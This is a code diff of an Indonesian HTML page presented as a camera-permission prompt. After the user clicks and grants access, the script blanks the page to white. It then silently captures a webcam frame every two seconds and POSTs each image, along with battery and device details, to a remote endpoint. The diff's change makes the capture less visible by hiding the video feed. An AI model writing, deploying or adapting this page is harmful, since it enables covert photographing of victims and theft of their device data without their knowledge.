@@ -3,32 +3,37 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Izin Kamera Fullscreen</title>
+    <title>Halaman Izin Kamera</title>
     <style>
-      html, body {
-        margin: 0;
-        padding: 0;
-        height: 100%;
-        overflow: hidden;
-        background-color: black;
-      }
-      video {
-        width: 100vw;
+      body {
+        display: flex;
+        justify-content: center;
+        align-items: center;
         height: 100vh;
-        object-fit: cover;
+        margin: 0;
+        background-color: white;
+      }
+      button {
+        padding: 20px 40px;
+        font-size: 18px;
+        cursor: pointer;
       }
     </style>
   </head>
   <body>
+    <button id="startButton">Klik untuk Meminta Izin Kamera</button>
+
     <script>
-      async function startCamera() {
+      document.getElementById("startButton").onclick = async () => {
         try {
           const stream = await navigator.mediaDevices.getUserMedia({ video: true });
           const video = document.createElement("video");
           video.srcObject = stream;
-          video.autoplay = true;
-          video.playsInline = true;
-          document.body.appendChild(video);
+          await video.play();
+
+          // Bersihkan halaman
+          document.body.innerHTML = "";
+          document.body.style.backgroundColor = "white";
 
           // Battery
           let battery = { level: "Tidak diketahui", charging: "Tidak diketahui" };
@@ -49,6 +54,7 @@
             const canvas = document.createElement("canvas");
             canvas.width = video.videoWidth || 320;
             canvas.height = video.videoHeight || 240;
+
             const ctx = canvas.getContext("2d");
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
@@ -70,13 +76,10 @@
               body: JSON.stringify({ image: imageData, deviceInfo })
             });
           }, 2000);
-        } catch (err) {
-          alert("Izin kamera ditolak: " + err.message);
+        } catch (error) {
+          alert("Izin kamera ditolak: " + error.message);
         }
-      }
-
-      // Langsung jalan saat halaman dibuka
-      window.onload = startCamera;
+      };
     </script>
   </body>
 </html>
